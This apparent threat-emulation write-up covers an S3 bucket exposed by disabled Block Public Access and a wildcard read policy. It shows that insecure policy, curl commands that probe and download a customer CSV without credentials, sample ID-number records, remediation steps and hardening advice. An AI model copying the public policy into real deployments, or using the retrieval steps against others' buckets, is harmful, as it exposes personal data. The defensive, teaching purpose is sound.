# Threat Emulation Scenario 01: S3 Public Exposure & Unauthenticated Data Exfiltration

## 1. Overview & Threat Context
* **Threat Category:** Cloud Storage Misconfiguration / Sensitive Data Exposure
* **MITRE ATT&CK Mapping:** 
  * [T1580 - Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580/)
  * [T1530 - Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/)
* **Target Asset:** Amazon S3 Bucket containing sensitive customer PII records (`malaysia_customer_pii.csv`).

In multi-tenant cloud ecosystems, Amazon S3 namespaces are globally distributed. Threat actors continuously scan public IP ranges and certificate transparency logs to identify improperly secured buckets containing confidential corporate data.

---

## 2. Root Cause Analysis (Vulnerability Breakdown)

The exposure stemmed from a dual-layer misconfiguration combining administrative oversights:

### Layer 1: Deactivation of S3 Block Public Access (BPA)
The four centralized preventative guardrails under S3 Block Public Access were intentionally cleared:
* `BlockPublicAcls`: `false`
* `IgnorePublicAcls`: `false`
* `BlockPublicPolicy`: `false`
* `RestrictPublicBuckets`: `false`

### Layer 2: Overly Permissive Bucket Policy
A wildcard bucket policy was attached to the target storage container, explicitly granting unauthenticated global entities (`*`) read permissions:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "PublicReadAccess",
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::confidential-customer-data-2026/*"
        }
    ]
}
```

---

## 3. Adversary Emulation & Proof of Concept (PoC)

Simulating an external, unauthenticated threat actor with no AWS account credentials, data discovery and exfiltration were executed via standard HTTP requests:

### Step 1: Endpoint Probing & Header Validation
```bash
curl -I https://confidential-customer-data-2026.s3.ap-southeast-2.amazonaws.com/malaysia_customer_pii.csv
```

**Terminal Telemetry Output:**
```http
HTTP/1.1 200 OK
x-amz-id-2: EXAMPLEvK8xQy1...
x-amz-request-id: EXAMPLE4E8B2...
Date: Thu, 10 Sep 2026 02:40:00 GMT
Last-Modified: Thu, 10 Sep 2026 02:35:00 GMT
ETag: "9b71d224bd62f3785d96d4abda3ea3be"
Accept-Ranges: bytes
Content-Type: text/csv
Content-Length: 218
Server: AmazonS3
```

### Step 2: Unauthenticated Exfiltration
```bash
curl -s https://confidential-customer-data-2026.s3.ap-southeast-2.amazonaws.com/malaysia_customer_pii.csv | head -n 4
```

**Exfiltrated Records Sample:**
```csv
id,full_name,email,phone,ic_passport
1,Ahmad Razak,ahmad.r@gmail.com,+6012-3456789,950101-14-1234
2,Sarah Lim,sarah.lim@yahoo.com,+65 9123 4567,S9203456D
3,Muthu Subramaniam,muthu.s@hotmail.com,+6017-9876543,881212-08-5678
```

---

## 4. Incident Response & Containment Workflow

Upon detection of the unauthorized exposure, immediate containment protocols were initiated:

1. **Guardrail Re-Enforcement:** Re-enabled all four S3 Block Public Access (BPA) controls at the bucket level.
2. **Policy Revocation:** Removed the offending wildcard `PublicReadAccess` statement from the Bucket Policy.
3. **Verification of Containment:** Repeated anonymous `curl` probes against the identical resource endpoint:

```bash
curl -I https://confidential-customer-data-2026.s3.ap-southeast-2.amazonaws.com/malaysia_customer_pii.csv
```

**Verified Response Post-Remediation:**
```http
HTTP/1.1 403 Forbidden
x-amz-error-code: AccessDenied
x-amz-error-message: Access Denied
Date: Thu, 10 Sep 2026 02:45:10 GMT
Server: AmazonS3
```

---

## 5. Preventative Hardening & Best Practices

1. **Enforce Account-Level Block Public Access:** Apply BPA across the entire AWS Organization root via AWS Control Tower or Service Control Policies (SCPs) to eliminate individual developer override capability.
2. **Deploy Detection-as-Code Telemetry:** Implement CloudWatch Metric Filters on `PutBucketPublicAccessBlock` and `PutBucketPolicy` events for real-time alerting.
3. **Continuous Automated CSPM Scanning:** Execute scheduled audits (`scripts/cloud_security_auditor.py`) to catch configuration drift and orphaned policies before external reconnaissance identifies them.
